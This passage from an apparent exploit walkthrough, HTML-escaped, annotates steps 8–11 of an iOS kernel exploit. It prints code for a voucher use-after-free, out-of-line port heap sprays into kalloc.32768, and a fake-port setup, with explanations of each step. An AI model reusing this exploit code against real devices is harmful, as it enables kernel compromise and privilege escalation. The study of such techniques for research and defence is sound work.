    	&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_swap_mach_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;release_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inout_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s returned %d: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;task_swap_mach_voucher&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_error_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// At this point we've successfully tweaked the voucher reference counts, but our port&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// reference counts might be messed up because of the voucher port returned in&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// inout_voucher! We need to deallocate it (it's extra anyways, since&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// task_swap_mach_voucher() doesn't swallow the existing send rights).&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inout_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_port_deallocate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inout_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-8-create-the-ool-ports-pattern-that-will-overlap-the-freed-voucher&quot;&gt;Step 8: Create the OOL ports pattern that will overlap the freed voucher&lt;/h4&gt;

&lt;p&gt;Now we need to create a pattern of OOL port pointers which will eventually overlap our vouchers. The author chooses the &lt;strong&gt;kalloc.32768&lt;/strong&gt; zone to overlap the voucher , simply because its &lt;strong&gt;2&lt;em&gt;(BLOCK_SIZE(ipc_voucher))** or **2&lt;/em&gt;(0x4000)&lt;/strong&gt; and hence it will be easier to predict the offsets for the voucher. The number of port pointers are calculated based on the zone size divided by size of &lt;strong&gt;uint64_t&lt;/strong&gt; which is the size of a port pointer. Then &lt;strong&gt;calloc&lt;/strong&gt; call is used to initialize an array with the number of port pointers, each of size &lt;strong&gt;mach_port_t&lt;/strong&gt; and then set to 0. The &lt;strong&gt;iterate_ipc_vouchers_via_mach_ports&lt;/strong&gt; function is used to walk through the port pointers assuming them as vouchers and using a call back function giving out the offset of the voucher, and then setting &lt;strong&gt;iv_refs&lt;/strong&gt; of the voucher to point to the base port, which you must remember from Step 2. The &lt;strong&gt;ool_ports[voucher_start + 1]&lt;/strong&gt; is used because the &lt;strong&gt;iv_refs&lt;/strong&gt; is at an offset &lt;strong&gt;0x8&lt;/strong&gt; from the start of the voucher, and hence &lt;strong&gt;ool_ports[voucher_start + 1]&lt;/strong&gt; will actually point to index &lt;strong&gt;0x8&lt;/strong&gt; of the voucher. We will make the &lt;strong&gt;iv_refs&lt;/strong&gt; field point to the base port, which is just before the pipe buffers. We also leave the &lt;strong&gt;iv_port&lt;/strong&gt; pointer as &lt;strong&gt;MACH_PORT_NULL&lt;/strong&gt; (set by calloc), so that when we can call &lt;strong&gt;thread_get_mach_voucher&lt;/strong&gt; later on we get a new voucher port.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Create&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;that&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;we&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;will&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;spray&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;overwrite&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;freed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// We will reallocate the voucher to kalloc.32768, which is a convenient size since it lets&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// us very easily predict what offsets in the allocation correspond to which fields of the&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// voucher.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BLOCK_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16384&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_port_spray_kalloc_zone&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32768&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_port_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_port_spray_kalloc_zone&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;calloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Now, walk though and initialize the &quot;vouchers&quot; in the ool_ports array.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;iterate_ipc_vouchers_via_mach_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// Send an OOL port one pointer past the start of the voucher. This will cause the&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// port pointer to overlap the voucher's iv_refs field, allowing us to use the&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// voucher port we'll get from thread_get_mach_voucher() later without panicking.&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// This port plays double-duty since we'll later use the reference count bug again&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// to increment the refcount/port pointer to point into our pipe buffer spray,&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// giving us a fake port.&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// Leave the voucher's iv_port field (index 7) as MACH_PORT_NULL, so that we can&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// call thread_get_mach_voucher() to get a new voucher port that references this&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// voucher. This is what allows us to manipulate the reference count later to&lt;/span&gt;
    		&lt;span class=&quot;c1&quot;&gt;// change the OOL port set above.&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-9-free-the-first-gc-spray&quot;&gt;Step 9: Free the first GC Spray&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Free&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;spray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;This&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;makes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;that&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;available&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zone&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;garbage&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;collection&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// in the loop below.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;destroy_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gc_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gc_port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-10-release-the-vouchers-created-earlier-thereby-leaving-a-dangling-port&quot;&gt;Step 10: Release the Vouchers created earlier thereby leaving a dangling port&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 10\. Free the vouchers we created earlier. This leaves a voucher pointer dangling in our&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// thread's ith_voucher field. The voucher ports we created earlier are all now invalid.&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// The voucher objects themselves have all been overwritten with 0xdeadbeefdeadbeef. If we&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// call thread_get_mach_voucher() here, we'll get an &quot;os_refcnt: overflow&quot; panic, and if we&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// call thread_set_mach_voucher() to clear it, we'll get an &quot;a freed zone element has been&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// modified in zone ipc vouchers&quot; panic.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;voucher_spray_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher_spray_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;step-11-release-the-vouchers-to-overlap-with-the-port-pointers&quot;&gt;Step 11: Release the Vouchers to overlap with the port pointers&lt;/h4&gt;

&lt;p&gt;If you remember from Step 6, we used 500 (&lt;strong&gt;gc_port_count&lt;/strong&gt;) of the &lt;strong&gt;2000&lt;/strong&gt; ports that we had bumped the queue limit to already for spraying. So now we will spray the other ports until we hit the total spray size as &lt;strong&gt;17%&lt;/strong&gt; of our platform size. The &lt;strong&gt;ool_holding_ports&lt;/strong&gt; pointer is taken from index 500 (&lt;strong&gt;gc_port_count&lt;/strong&gt;) onwards since we already used the first &lt;strong&gt;500&lt;/strong&gt; for spraying. The idea is to also keep allocation size as &lt;strong&gt;32768&lt;/strong&gt; so that it lands in the &lt;strong&gt;kalloc.32768&lt;/strong&gt; zone, this is done by keeping the number of port pointers for each message (&lt;strong&gt;ool_port_count = ool_port_spray_kalloc_zone / sizeof(uint64_t&lt;/strong&gt;), where &lt;strong&gt;ool_port_spray_kalloc_zone = 32768&lt;/strong&gt;), and hopefully after this the memory freed earlier from the vouchers will be reallocated here.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 11\. Reallocate the freed voucher with the OOL port pattern created earlier in the&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// kalloc.32768 zone. We need to do this slowly in order to force a zone garbage&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// collection. Spraying 17% of memory (450 MB on the iPhone XR) with OOL ports should be&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// plenty.&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_ports_spray_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;platform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;memory_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_port_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_holding_ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gc_ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gc_port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_holding_port_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// Use at most 500 ports for the spray.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;sprayed_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_ports_spray_size_with_gc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_holding_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_holding_port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;message_size_for_kalloc_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_MAKE_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;ool_ports_spray_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sprayed %zu bytes of OOL ports to %zu ports in kalloc.%zu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    			&lt;span class=&quot;n&quot;&gt;sprayed_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_holding_port_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_port_spray_kalloc_zone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If you look under the method &lt;strong&gt;ool_ports_spray_size_with_gc&lt;/strong&gt;, there is also delay added between every &lt;strong&gt;2MB&lt;/strong&gt; (&lt;strong&gt;gc_step&lt;/strong&gt;) of spray with &lt;strong&gt;usleep()&lt;/strong&gt; to give time for zone garbage collection.&lt;/p&gt;

&lt;p&gt;Each of these ports are sprayed using mach messages with OOL port descriptors. This will allocate kernel memory and fill them with port pointers. The following code in &lt;strong&gt;ool_ports_spray_port&lt;/strong&gt; is used to allocate parameters and send the message.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// Populate the message. Each OOL ports descriptor will be a kalloc.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_bits&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_SET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_MAKE_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSGH_BITS_COMPLEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_remote_port&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;holding_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_size&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_id&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ools&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_descriptor_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_msg_ool_ports_descriptor_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_descriptor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;ool_descriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_OOL_PORTS_DESCRIPTOR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;ool_descriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ool_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
